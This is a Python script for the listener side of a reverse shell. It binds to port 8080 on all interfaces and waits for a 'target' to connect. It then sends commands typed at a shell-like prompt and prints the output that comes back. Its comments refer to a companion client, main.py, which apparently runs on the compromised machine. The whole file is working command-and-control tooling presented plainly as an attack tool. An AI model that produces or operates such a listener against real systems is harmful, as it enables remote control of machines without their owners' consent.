#!/usr/bin/env python3
import socket

# Configuration: Listen on all network interfaces on port 8080
HOST = '0.0.0.0'
PORT = 8080

print(f"[*] Listener active on {HOST}:{PORT}")
print("[*] Waiting for incoming connection...\n")

# Initialize the server socket
# AF_INET = IPv4, SOCK_STREAM = TCP
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# SO_REUSEADDR allows the kernel to reuse the local address/port 
# without waiting for the timeout state to expire.
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

# Bind the socket to the address and port
s.bind((HOST, PORT))

# Listen for 1 connection at a time
s.listen(1)

# Accept the connection from the target (client)
conn, addr = s.accept()
print(f"[+] Connection established from {addr[0]}:{addr[1]}")
print("[*] Enter commands (type 'exit' to close session)\n")

# Variable to store the current directory path for the prompt
current_dir = "Unknown"

while True:
    try:
        # User input prompt that simulates a real shell
        cmd = input(f"{current_dir}$ ").strip()
        
        if cmd.lower() in ['exit', 'quit']:
            conn.send(b'exit') # Tell the client to close the connection
            print("\n[*] Closing session.")
            break
        
        if cmd:
            # Send the encoded command to the client
            conn.send(cmd.encode())
            
            # Receive the output (max 4096 bytes)
            output = conn.recv(4096)
            output_text = output.decode(errors='replace')
            print(output_text)
            
            # Logic to update the prompt based on client's output
            # (Matches the string formatting used in main.py)
            if output_text.startswith('Now in: '):
                current_dir = output_text.replace('Now in: ', '').strip()
            elif output_text.startswith('Current: '):
                current_dir = output_text.replace('Current: ', '').strip()
    
    except KeyboardInterrupt:
        print("\n\n[*] Manual Interrupt (Ctrl+C).")
        try:
            conn.send(b'exit')
        except:
            pass
        break

conn.close()
s.close()
